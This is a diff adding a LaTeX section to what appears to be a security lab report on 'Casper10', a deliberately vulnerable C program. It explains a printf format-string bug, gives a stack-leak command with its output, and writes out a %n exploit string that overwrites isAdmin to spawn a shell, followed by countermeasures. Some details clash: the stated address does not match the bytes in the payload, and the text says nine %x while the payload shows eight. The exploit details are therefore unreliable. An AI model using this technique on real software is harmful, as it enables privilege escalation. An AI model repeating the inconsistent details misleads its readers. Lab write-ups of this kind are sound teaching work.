@@ -1,1 +1,35 @@
 \section{Data-only Buffer Overflow}
+\subsection{Casper 10}
+\subsubsection{Description and vulnerability}
+Casper10 is slightly more complex than the previous programs. It declares a global variable, \texttt{isAdmin}, initially set to 0. As the previous levels, it takes a parameter from the command line and uses the function \texttt{greetUser} to copy the parameter in a buffer and then ``greet'' the user, by printing a message using the \texttt{printf} function. Afterwards, if \texttt{isAdmin} is evaluated to a true boolean expression (meaning any non-zero value in C), it opens a \texttt{/bin/xh} shell. 
+
+In a ``normal'' use, this program does not drop the user in a shell, since \texttt{isAdmin} does not change its value along the execution. Nevertheless, Casper10 uses \texttt{printf} in an unsafe way and hence contains a string format vulnerability. The intended (and safe) use of \texttt{printf} requires the programmer to specify one or more positional parameters to print values. As a concrete example, in Casper10 a safe \texttt{printf} use would be \texttt{printf(``\%s'', buf)} instead of \texttt{printf(buf)}. This clumsy use makes an exploit possible. By providing a format string, instead of a ``normal'' string, it is possible to overwrite \texttt{isAdmin} in order to open a shell. The fact that C enters the \texttt{if} branch with any non-zero value makes the exploit even simpler. 
+
+\subsubsection{Exploit}
+The idea behind this exploit is relatively simple: the wrong \texttt{printf} use makes it possible to pass as an argument a string containing the \texttt{isAdmin}'s memory address and some positional parameters to skip space and write the memory. This procedure hides some subtle troubles. First of all, it is necessary to know the address of \texttt{isAdmin}. This can be easily determined with \texttt{gdb}, and corresponds to \texttt{0x08049904}. Next, it is fundamental to know the distance between the end of the stack frame and the beginning of the format string memory. This can be determined using the same vulnerability, but in its ``reading'' version. In order to do so, the following command has been used: \\
+\texttt{/casper/casper10 AAAA\$(python -c ``print '\%08x.'*40'')}\\
+It printed the following string: \\
+\texttt{
+	Hello AAAA080486d0.bffff74a.00000000.00000001.0000094e.b7fdce08.\\
+	bffff74a.6548e5f9.206f6c6c.\colorbox{yellow}{41414141}.78383025.3830252e.30252e78.\\
+	252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.\\
+	78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.\\
+	30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.\\
+	2e783830.78383025.3830252e.30252e78.252e7838.2e783830.!} \\
+As you can see, \texttt{41414141} is highlighted. It corresponds to the string \texttt{AAAA} placed at the beginning of the format string. A simple count of the bytes before \texttt{41414141} gives the distance between the end of the stack frame and the beginning of the format string memory. This number is nine. Now the following information is available:
+\begin{itemize}
+	\item \texttt{isAddress} is at \texttt{0x08049904};
+	\item Nine bytes are above the format string memory.
+\end{itemize}
+The exploit aims to ``jump'' those nine bytes, and to write in a memory location corresponding to \texttt{isAdmin}'s address. Hence, the following command is used to exploit Casper10:\\
+\texttt{\$(printf ``$\backslash$x40$\backslash$x99$\backslash$x04$\backslash$x08'')\%x\%x\%x\%x\%x\%x\%x\%x\%100x\%n} \\
+The first part prints the address of the global variable the exploit aims to overwrite. Afterwards, nine format parameters (\texttt{\%x}) are provided. They are only needed to step through memory. In the end, \texttt{\%n} requests to write the memory address specified at the beginning of the string. 100 makes \texttt{printf} write a non-zero value. 
+
+In this way \texttt{isAdmin} is overwritten with a non-zero value. Hence, the \texttt{if}'s guard condition will be true and a shell will be opened.
+
+In order to run the exploit it is enough to run \texttt{make exploit10}.
+
+\subsubsection{Possible countermeasures}
+An immediate countermeasure would be using \texttt{print} correctly. By specifying \texttt{``\%s''} before the buffer variable, the provided string is not interpreted as a format string, and printed as-is, without affecting the memory. Another possibility is looking for suspicious characters in the string, such as \texttt{\%x}, \texttt{\%n} or memory addresses. 
+
+A source code independent countermeasure is layout randomization. Making the address of \texttt{isAdmin} as well as the distance between the end of the stack frame and the beginning of the format string memory change every time makes this exploit not work anymore. 
